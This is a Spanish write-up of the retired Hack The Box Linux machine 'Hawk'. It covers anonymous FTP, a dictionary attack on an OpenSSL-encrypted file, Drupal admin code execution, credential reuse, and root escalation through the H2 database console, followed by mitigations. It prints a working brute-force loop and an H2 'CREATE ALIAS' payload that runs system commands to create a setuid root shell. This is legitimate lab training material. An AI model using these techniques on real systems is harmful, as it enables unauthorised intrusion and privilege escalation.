---
machine: Hawk
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, ftp, openssl, drupal, h2, symlink, privesc]
---

# Hawk — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

El FTP anónimo entrega un archivo cifrado con OpenSSL; un ataque de diccionario recupera la contraseña y da acceso al admin de Drupal. La ejecución PHP en Drupal da `www-data`, y la reutilización de credenciales lleva a `daniel`. H2 corre como root: un symlink a `root.txt` en el backup filtra el flag, y `CREATE ALIAS` ejecuta Java para obtener una shell de root.

## Reconocimiento

```bash
nmap -Pn -sCV -p21,22,80,5435,8082,9092 <IP>
```

- `21` FTP con login anónimo, `22` SSH, `80` Drupal 7.58.
- `8082` es la consola de H2; `5435` y `9092` son puertos relacionados.
- La web es Drupal y no es vulnerable a Drupalgeddon2.

## Enumeración

El FTP anónimo tiene `.drupal.txt.enc`, cifrado con OpenSSL y base64. Un bucle con `rockyou` prueba contraseñas y encuentra la clave; el texto revela las credenciales del admin de Drupal.

```bash
while read p; do openssl enc -d -a -AES-256-CBC -in .drupal.txt.enc -k "$p" >/dev/null 2>&1 && echo "$p" && break; done < rockyou.txt
```

## Foothold

Con el admin de Drupal se edita una plantilla PHP o se sube un módulo para ejecutar código y obtener `www-data`.

## Movimiento lateral

La contraseña del admin se reutiliza para `daniel` por SSH.

```bash
ssh daniel@hawk.htb
```

## Escalada de privilegios

H2 escucha en localhost como root. Se crea un túnel SSH a `8082` y se usa la consola. En el backup de H2 se puede poner un symlink `t.trace.db` a `/root/root.txt` y descargar el ZIP con el flag. Para una shell, se inicia sesión en H2 y se crea un alias Java:

```sql
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : ""; } $$;
CALL SHELLEXEC('cp /bin/bash /tmp/root; chmod 6777 /tmp/root');
```

## Evidencia

- FTP anónimo y archivo OpenSSL.
- Fuerza bruta y admin de Drupal.
- RCE PHP y `www-data`.
- Reutilización de credenciales y `daniel`.
- H2 como root, symlink y `CREATE ALIAS`.

## Lecciones aprendidas

- Los archivos cifrados con contraseñas débiles se rompen con diccionario.
- La reutilización de credenciales conecta web y sistema.
- H2 expuesto y ejecutándose como root es RCE.
- Los backups que siguen symlinks filtran archivos arbitrarios.

## Mitigación y detección

- Deshabilitar FTP anónimo y usar claves.
- Contraseñas únicas y gestión de secretos.
- No ejecutar H2 como root y restringir la consola.
- Resolver symlinks y limitar backups a directorios permitidos.

## Referencias

- [0xdf — Hawk](https://0xdf.gitlab.io/2018/11/30/htb-hawk.html)
- [IppSec — Hawk](https://www.youtube.com/watch?v=UGd9JE1ZXUI)
- [Hack The Box — Hawk](https://app.hackthebox.com/machines/hawk)
